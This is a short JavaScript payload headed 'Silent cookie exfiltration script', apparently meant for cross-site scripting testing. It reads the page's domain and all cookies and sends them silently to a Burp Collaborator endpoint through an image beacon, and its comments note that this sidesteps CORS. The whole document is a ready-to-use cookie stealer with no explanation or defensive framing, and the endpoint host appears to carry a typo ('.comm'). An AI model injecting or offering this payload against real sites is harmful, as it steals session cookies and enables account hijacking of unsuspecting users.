// Silent cookie exfiltration script

// Get document domain and cookies
var domain = document.domain;
var cookies = document.cookie;

// Define your Burp Collaborator endpoint
var exfilURL = "https://y54qs3qrc8ho12j7omu9y5nprgx7la9z.oastify.comm";

// Send via image beacon (bypasses CORS)
var img = new Image();
img.src = exfilURL + "/?domain=" + encodeURIComponent(domain) + "&cookie=" + encodeURIComponent(cookies);
